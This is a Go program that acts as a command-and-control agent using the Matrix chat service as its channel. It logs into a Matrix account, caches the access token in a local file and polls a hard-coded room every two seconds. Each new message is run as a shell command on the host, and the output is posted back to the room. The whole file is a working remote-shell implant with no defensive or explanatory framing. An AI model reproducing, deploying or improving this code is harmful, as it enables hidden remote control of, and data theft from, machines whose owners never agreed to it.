package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"

	uuid "github.com/google/uuid"
)

var CLI *http.Client

type authstats struct {
	DEVID string
	ACTK  string
}

func Auth() authstats {

	fmt.Println("\t[*] Authenticating to Matrix API")

	type Recv struct {
		User_id      string `json:"user_id"`
		Access_token string `json:"access_token"`
		Home_server  string `json:"home_server"`
		Device_id    string `json:"device_id"`

		Wellknown struct {
			Mhomeserver struct {
				Base_url string `json:"base_url"`
			} `json:"m.homeserver"`
		} `json:"well_known"`
	}

	baseurl := "https://matrix-client.matrix.org/_matrix/client/v3/login"

	var authobj = []byte(`
{
	"identifier": {
		"type": "m.id.user",
		"user": "<user>"
	},
	"initial_device_display_name": "rocks",
	"password": "<secrets>",
	"type": "m.login.password"
}`)

	req, err := http.NewRequest(http.MethodPost, baseurl, bytes.NewBuffer(authobj))
	if err != nil {
		panic(err)
	}

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		panic(err)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}
	_ = resp.Body.Close()

	fmt.Println("[*] Response Status: ", resp.Status)

	var r Recv
	err = json.Unmarshal([]byte(body), &r)
	if err != nil {
		fmt.Println("[-] Error occured marshaling")
		panic(err)
	}
	fmt.Println("\t[*] Access Token Obtained: ", r.Access_token)
	fmt.Println("\t[*] Assigned Device ID: ", r.Device_id)

	var xxxx authstats
	xxxx.ACTK = r.Access_token
	xxxx.DEVID = r.Device_id
	return xxxx
}

func Talk(msg string, accesstoken string) int {
	fmt.Println("===Replying to Control")

	//room_id := "!hpyUrieqLknjUawXPS:matrix.org"

	// remeber to add transaction ID and increment

	type event struct {
		Event_Id string `json:"event_id"`
	}

	type message struct {
		Body   string `json:"body"`
		Txtype string `json:"msgtype"`
	}

	trid := uuid.New().String()

	base := "https://matrix-client.matrix.org/_matrix/client/v3/rooms/!hpyUrieqLknjUawXPS%3Amatrix.org/send/m.room.message/" + trid + "?" + "access_token=" + accesstoken
	m := &message{Body: msg, Txtype: "m.text"}
	n, err := json.Marshal(m)
	if err != nil {
		panic(err)
	}

	req, err := http.NewRequest(http.MethodPut, base, bytes.NewBuffer(n))
	if err != nil {
		panic(err)
	}
	req.Header.Set("access_token", accesstoken)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		panic(err)
	}

	b, err := io.ReadAll(resp.Body)
	if err != nil {
		panic(err)
	}

	var e event
	err = json.Unmarshal([]byte(b), &e)
	if err != nil {
		panic(err)
	}

	if resp.StatusCode != 200 {
		fmt.Println("\t[*] Message Delivery Status: ", resp.Status)

		return 0
	}

	fmt.Println("\t[*] Status Code: ", resp.Status)
	fmt.Println("\t[*] Message ID: ", e.Event_Id)
	fmt.Println("\t[*] Message UUID: ", trid)

	ct, err := os.ReadFile("cfg")
	if err != nil {
		panic(err)
	}

	l := strings.Split(string(ct), "\n")
	r := "LSID:" + e.Event_Id
	l[2] = r

	cfgfile, err := os.Open("cfg")
	if err != nil {
		panic(err)
	}
	cfgfile.Truncate(0)

	b = []byte(string(l[0] + "\n" + l[1] + "\n" + l[2]))
	os.WriteFile(cfgfile.Name(), b, 0666)

	defer cfgfile.Close()
	return 1
}

func Listen(accesstoken string) {

	baseurl := "https://matrix-client.matrix.org/_matrix/client/v3/rooms/!hpyUrieqLknjUawXPS%3Amatrix.org/messages?dir=b&limit=1&" + "access_token=" + accesstoken
	req, err := http.NewRequest(http.MethodGet, baseurl, nil)
	if err != nil {
		panic(err)
	}
	req.Header.Set("access_token", accesstoken)

	type ct struct {
		Content struct {
			Body    string `json:"body"`
			MsgType string `json:"msgtype"`
		}
		Originserv int    `json:"origin_server_ts"`
		Roomid     string `json:"room_id"`
		Sender     string `json:"sender"`
		Type       string `json:"type"`
		Unsigned   struct {
			Age int `json:"age"`
		}
		EventID string `json:"event_id"`
		UserID  string `json:"user_id"`
		Age     int    `json:"age"`
	}

	type chk struct {
		Chunk []ct
		Start string `json:"start"`
		End   string `json:"End"`
	}

	// loop and look for last sent message ID - line 3 in cfg

	cfgdat, err := os.ReadFile("cfg")
	if err != nil {
		panic(err)
	}

	l := strings.Split(string(cfgdat), "\n")

	var c chk
	for _, line := range l {
		if strings.Contains(line, "LSID:") {
			fmt.Println("[*] Listening for new commands\n\tDelta to Compare to: ", line[5:])
			for {

				time.Sleep(time.Second * 2)

				resp, err := http.DefaultClient.Do(req)
				if err != nil {
					panic(err)
				}
				b, err := io.ReadAll(resp.Body)
				if err != nil {
					panic(err)
				}
				err = json.Unmarshal(b, &c)
				if err != nil {
					panic(err)
				}

				if line[5:] != c.Chunk[0].EventID {
					in := c.Chunk[0].Content.Body
					cmdarr := strings.Split(in, " ")

					fmt.Println("[*] Command to run: ", cmdarr[0])

					if len(cmdarr) > 1 {
						cmd := exec.Command(cmdarr[0], cmdarr[1:]...)
						var stdout bytes.Buffer
						cmd.Stdout = &stdout
						cmd.Stderr = &stdout
						err = cmd.Run()
						if err != nil {
							panic(err)
						}
						s := stdout.Bytes()
						fmt.Printf("Output : %s", string(s)+"\n")

						_ = Talk(string(s), accesstoken)
					} else {
						cmd := exec.Command(cmdarr[0])
						var stdout bytes.Buffer
						cmd.Stdout = &stdout
						cmd.Stderr = &stdout
						err = cmd.Run()
						if err != nil {
							panic(err)
						}
						s := stdout.Bytes()
						fmt.Printf("Output : %s", string(s)+"\n")

						_ = Talk(string(s), accesstoken)
					}

				}

			}
		}
	}

}

func CheckAuth() authstats {
	fmt.Println("===AUTH")
	it := 0

	var a authstats

	nwline := [3]string{"ACTK:", "DVID:", "LSID:"}

	cfgfile, err := os.OpenFile("cfg", os.O_RDWR|os.O_APPEND, 0666)
	if os.IsNotExist(err) {
		cfgfile, err = os.Create("cfg")
		if err != nil {
			panic(err)
		}
		fmt.Println("\t[*] Making Configuration File")

		a = Auth()

		nwline[0] = nwline[0] + a.ACTK + "\n"
		nwline[1] = nwline[1] + a.DEVID + "\n"
		nwline[2] = "LSID:"

		b := []byte(string(nwline[0] + nwline[1] + nwline[2]))

		err := os.WriteFile("cfg", b, 0666)
		if err != nil {
			panic(err)
		}

	} else {
		fmt.Println("\t[*] Authentication Read From Configuration File")
		scn := bufio.NewScanner(cfgfile)
		scn.Split(bufio.ScanLines)

		for scn.Scan() {
			switch it {
			case 0:
				a.ACTK = scn.Text()
				it++
			case 1:
				a.DEVID = scn.Text()
				it++
			}
		}
	}

	defer cfgfile.Close()

	a.ACTK = a.ACTK[5:]
	a.DEVID = a.DEVID[5:]
	return a

}

func main() {

	// authentication, will find out how often this needs to be some other time
	a := CheckAuth()
	fmt.Println("\t[*] ACT: ", a.ACTK)
	fmt.Println("\t[*] DEVID: ", a.DEVID)

	Listen(a.ACTK)

	defer http.DefaultClient.CloseIdleConnections()
}
